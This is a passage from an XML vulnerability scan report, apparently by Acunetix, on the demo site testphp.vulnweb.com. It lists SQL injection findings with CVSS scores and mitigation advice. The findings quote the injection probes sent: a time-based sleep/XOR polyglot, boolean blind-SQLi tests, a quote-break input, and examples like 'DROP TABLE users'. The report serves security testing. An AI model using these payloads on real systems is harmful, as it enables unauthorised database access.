<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /cart.php HTTP/1.1
Content-Length: 142
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

addcart=if(now()=sysdate()%2csleep(0)%2c0)/*'XOR(if(now()=sysdate()%2csleep(0)%2c0))OR'&quot;XOR(if(now()=sysdate()%2csleep(0)%2c0))OR&quot;*/&amp;price=800]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:58 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5149
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="47" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">id</font></b> was set to <b><font color="dark">3 AND 3*2*1=6 AND 519=519</font></b><br/><br/>Tests performed: <ul><li>1*1*1*3 =&gt; <b>TRUE</b></li><li>3*519*514*0 =&gt; <b>FALSE</b></li><li>13*5*2*999 =&gt; <b>FALSE</b></li><li>3*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*3 =&gt; <b>TRUE</b></li><li>13*1*1*0*1*1*519 =&gt; <b>FALSE</b></li><li>3 AND 5*4=20 AND 519=519 =&gt; <b>TRUE</b></li><li>3 AND 5*4=21 AND 519=519 =&gt; <b>FALSE</b></li><li>3 AND 5*6&lt;26 AND 519=519 =&gt; <b>FALSE</b></li><li>3 AND 7*7&gt;48 AND 519=519 =&gt; <b>TRUE</b></li><li>3 AND 3*2*0=6 AND 519=519 =&gt; <b>FALSE</b></li><li>3 AND 3*2*1=6 AND 519=519 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/AJAX/infoartist.php]]></Affects>
       <Parameter><![CDATA[id]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /AJAX/infoartist.php?id=3%20AND%203*2*1=6%20AND%20519=519 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:58 GMT
Content-Type: text/xml
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 1285
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="48" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">id</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infoartist.php on line 7</font></pre>]]></Details>
       <Affects><![CDATA[/AJAX/infoartist.php]]></Affects>
       <Parameter><![CDATA[id]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
